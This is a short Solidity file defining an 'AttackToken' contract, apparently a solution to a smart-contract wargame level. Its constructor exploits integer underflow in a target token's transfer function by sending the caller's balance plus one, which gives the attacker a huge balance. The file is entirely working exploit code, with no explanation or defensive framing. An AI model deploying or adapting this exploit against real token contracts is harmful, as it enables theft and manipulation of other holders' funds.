// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IToken {
    function transfer(address _to, uint _value) external;

    function balanceOf(address _owner) external view returns (uint balance);
}

contract AttackToken {
    constructor(address _token) public {
        IToken(_token).transfer(
            msg.sender,
            IToken(_token).balanceOf(msg.sender) + 1
        );
    }
}
